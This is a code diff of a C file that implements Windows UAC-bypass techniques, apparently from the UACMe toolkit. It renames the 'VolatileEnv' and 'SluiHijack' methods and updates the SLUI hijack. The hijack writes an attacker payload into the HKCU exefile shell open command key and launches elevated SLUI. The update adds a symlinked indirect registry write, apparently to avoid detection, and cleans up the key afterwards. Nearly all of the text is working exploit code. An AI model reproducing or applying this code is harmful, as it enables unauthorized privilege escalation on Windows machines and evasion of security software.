@@ -4,9 +4,9 @@
 *
 *  TITLE:       BYTECODE77.C
 *
-*  VERSION:     2.87
+*  VERSION:     2.90
 *
-*  DATE:        19 Jan 2018
+*  DATE:        10 July 2018
 *
 *  bytecode77 autoelevation methods.
 *
@@ -30,7 +30,7 @@
 #include "global.h"
 
 /*
-* ucmMethodVolatileEnv
+* ucmVolatileEnvMethod
 *
 * Purpose:
 *
@@ -39,7 +39,7 @@
 * Fixed in Windows 10 RS3
 *
 */
-BOOL ucmMethodVolatileEnv(
+BOOL ucmVolatileEnvMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
@@ -105,22 +105,22 @@ BOOL ucmMethodVolatileEnv(
 }
 
 /*
-* ucmMethodSluiHijack
+* ucmSluiHijackMethod
 *
 * Purpose:
 *
 * Bypass UAC using registry HKCU\Software\Classes\exefile\shell\open hijack and SLUI elevated launch.
 *
 */
-BOOL ucmMethodSluiHijack(
+BOOL ucmSluiHijackMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    BOOL bResult = FALSE;
+    BOOL bResult = FALSE, bSymLinkCleanup = FALSE;
     HKEY hKey = NULL;
-    LRESULT lResult;
     SIZE_T sz = 0;
-    DWORD cbData = 0;
+    LRESULT lResult;
+    DWORD cbData = 0, dwKeyDisposition = 0;
     WCHAR szBuffer[MAX_PATH * 2];
 
     SHELLEXECUTEINFO shinfo;
@@ -136,28 +136,41 @@ BOOL ucmMethodSluiHijack(
     }
 #endif
 
+    sz = _strlen(lpszPayload);
+    if (sz == 0)
+        return FALSE;
+
      //
      // Create or open target key.
      //
     _strcpy(szBuffer, T_EXEFILE_SHELL);
     _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
     lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
-        REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
+        REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, &dwKeyDisposition);
 
     if (lResult == ERROR_SUCCESS) {
 
         //
         // Set "Default" value as our payload.
         //
-        sz = _strlen(lpszPayload);
         cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
+        if (g_ctx.MethodExecuteType == ucmExTypeRemediationRequired) {
 
-        lResult = RegSetValueEx(
-            hKey,
-            TEXT(""),
-            0, REG_SZ,
-            (BYTE*)lpszPayload,
-            cbData);
+            if (NT_SUCCESS(wdRegSetValueIndirectHKCU(szBuffer, NULL, lpszPayload, (ULONG)cbData))) {
+                bSymLinkCleanup = TRUE;
+                lResult = ERROR_SUCCESS;
+            }
+
+        }
+        else {
+
+            lResult = RegSetValueEx(
+                hKey,
+                TEXT(""),
+                0, REG_SZ,
+                (BYTE*)lpszPayload,
+                cbData);
+        }
 
         if (lResult == ERROR_SUCCESS) {
 
@@ -179,11 +192,23 @@ BOOL ucmMethodSluiHijack(
                 TerminateProcess(shinfo.hProcess, 0);
                 CloseHandle(shinfo.hProcess);
             }
-            RegDeleteValue(hKey, TEXT(""));
         }
-        RegFlushKey(hKey);
         RegCloseKey(hKey);
     }
+
+    //
+    // Remove symlink.
+    //
+    if (g_ctx.MethodExecuteType == ucmExTypeRemediationRequired) {
+        if (bSymLinkCleanup)
+            wdRemoveRegLinkHKCU();
+    }
+
+    //
+    // Remove key with all subkeys.
+    //
+    if (dwKeyDisposition == REG_CREATED_NEW_KEY)
+        supDeleteKeyRecursive(HKEY_CURRENT_USER, T_EXEFILE_SHELL);
 
 #ifndef _WIN64
     if (g_ctx.IsWow64) {
